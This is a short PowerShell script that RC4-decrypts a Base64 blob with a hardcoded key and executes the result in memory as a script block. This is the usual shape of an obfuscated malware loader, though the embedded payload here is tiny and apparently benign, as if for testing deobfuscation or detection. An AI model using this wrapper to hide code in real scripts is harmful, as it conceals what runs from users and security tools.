function decode_bytes {
    param([Byte[]]$input_bytes)

    $secret_key = ([system.Text.Encoding]::UTF8).GetBytes("s3cret")

    $s = New-Object Byte[] 256;
    $k = New-Object Byte[] 256;

    for ($index = 0; $index -lt 256; $index++)
    {
        $s[$index] = [Byte]$index;
        $k[$index] = $secret_key[$index % $secret_key.Length];
    }

    $offset = 0;
    for ($index = 0; $index -lt 256; $index++)
    {
        $offset = ($offset + $s[$index] + $k[$index]) % 256;
        $temp = $s[$index];
        $s[$index] = $s[$offset];
        $s[$offset] = $temp;
    }

    $index = $offset = 0;
    for ($x = 0; $x -lt $input_bytes.Length; $x++)
    {
        $index = ($index + 1) % 256;
        $offset = ($offset + $s[$index]) % 256;
        $temp = $s[$index];
        $s[$index] = $s[$offset];
        $s[$offset] = $temp;
        [int]$t = ($s[$index] + $s[$offset]) % 256;
        $input_bytes[$x] = $input_bytes[$x] -bxor $s[$t];
    }

    $input_bytes
}

&([scriptblock]::create(([system.Text.Encoding]::UTF8).GetString((decode_bytes ([System.Convert]::FromBase64String("JAB4ID0gJ29rJw=="))))))

